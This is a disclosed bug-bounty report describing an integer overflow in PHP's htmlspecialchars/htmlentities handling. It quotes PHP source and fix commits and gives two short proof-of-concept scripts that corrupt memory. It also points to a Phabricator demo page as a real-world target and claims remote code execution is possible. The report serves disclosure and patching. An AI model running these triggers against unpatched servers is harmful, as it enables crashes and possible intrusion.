# Integer Overflow in php_html_entities()

## Report Details
- **Report ID**: 140865
- **URL**: https://hackerone.com/reports/140865
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-05-25T02:45:23.224Z
- **Disclosed**: 2019-10-13T11:04:30.404Z

## Reporter
- **Username**: ryat
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
This bug report at https://bugs.php.net/bug.php?id=72135, and fixed in:
https://github.com/php/php-src/commit/41fc3c76e97a36ff3b505da7d704ca17bb171fdf
https://github.com/php/php-src/commit/0da8b8b801f9276359262f1ef8274c7812d3dfda
https://github.com/php/php-src/commit/e9559131152ab0fa89737db11ebe8f43e1435b96

```
static void php_html_entities(INTERNAL_FUNCTION_PARAMETERS, int all)
{
	...
	size_t new_len;
	...
	RETVAL_STRINGL(replaced, (int)new_len, 0);
}
```

The new_len is defined as size_t, then to be a signed int in RETVAL_STRINGL(), that results in new_len into a negative value and get a corrupted string-typed ZVAL.

```
ZEND_API int add_string_to_string(zval *result, const zval *op1, const zval *op2) /* {{{ */
{
	int length = Z_STRLEN_P(op1) + Z_STRLEN_P(op2);
	char *buf;

	if (IS_INTERNED(Z_STRVAL_P(op1))) {
		buf = (char *) emalloc(length+1);
		memcpy(buf, Z_STRVAL_P(op1), Z_STRLEN_P(op1));
	} else {
		buf = (char *) erealloc(Z_STRVAL_P(op1), length+1);
	}
	memcpy(buf + Z_STRLEN_P(op1), Z_STRVAL_P(op2), Z_STRLEN_P(op2));
```

The string add operations with a corrupted string-type ZVAL will able to lead to integer overflow and remote code execution. 

PoC:
```
<?php

ini_set('memory_limit', -1);
$str = htmlspecialchars(str_repeat('&', 0xffffffff/5));
echo "$str";

?>
```

A lot of functions with a corrupted string-typed ZVAL will able to lead to memory corruption, ex:

```
md5
...
defined
class_exists
function_exists
...
trigger_error
date_default_timezone_set
hash_init
...
date
gmdate
...
collator_create
normalizer_normalize
grapheme_strlen
...
```

PoC:
```
<?php

	ini_set('memory_limit', -1);
	$str = htmlspecialchars(str_repeat('&', 0xffffffff/5));
	md5($str);
	
?>
```

Exploitation of this bug in real world/apps:

A lot of PHP apps use htmlspecialchars/htmlentities handles user input data, and successful exploitation of this bug is possible, ex Phabricator:

https://github.com/phacility/phabricator/blob/121e68e3adae4cd21731b79c07ca89676def7e19/externals/wepay/demoapp/openaccount.php
```
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
	if (isset($_POST['account_name']) && isset($_POST['account_description'])) {
		// WePay sanitizes its own data, but displaying raw POST data on your own site is a XSS security hole.
		$name = htmlentities($_POST['account_name']);
		$desc = htmlentities($_POST['account_description']);
		try {
			$wepay = new WePay($_SESSION['wepay_access_token']);
			$account = $wepay->request('account/create', array(
				'name' => $name,
				'description' => $desc,
			));
			echo "Created account $name for '$desc'! View on WePay at <a href=\"$account->account_uri\">$account->account_uri</a>. See all of your accounts <a href=\"accountlist.php\">here</a>.";
		}
```

## Attachments
No attachments
